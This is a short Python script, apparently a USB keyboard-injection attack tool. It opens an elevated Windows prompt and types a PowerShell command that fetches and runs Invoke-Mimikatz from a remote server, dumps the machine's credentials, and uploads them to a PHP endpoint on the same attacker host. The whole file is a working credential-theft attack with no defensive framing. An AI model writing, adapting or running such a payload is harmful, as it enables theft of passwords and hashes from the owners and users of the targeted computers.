#!/usr/bin/env python3
import os
import time
import urllib.request

import argparse

import HID.utils.windows


def get_public_ip():
    ext_site = 'https://ident.me'
    public_ip = urllib.request.urlopen(ext_site).read().decode('utf-8')
    return public_ip


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-ip', type=str, help='the mimikatz server ip', default=get_public_ip())

    args = parser.parse_args()

    HID.utils.windows.command_prompt(run_as=True)
    time.sleep(3.0)
    HID.type_string('powershell \"IEX (New-Object Net.WebClient).DownloadString(\'http://{}/im.ps1\'); $output = Invoke-Mimikatz -DumpCreds; (New-Object Net.WebClient).UploadString(\'http://{}/rx.php\', $output)\"\n'.format(args.ip, args.ip))
    
    time.sleep(15.0)
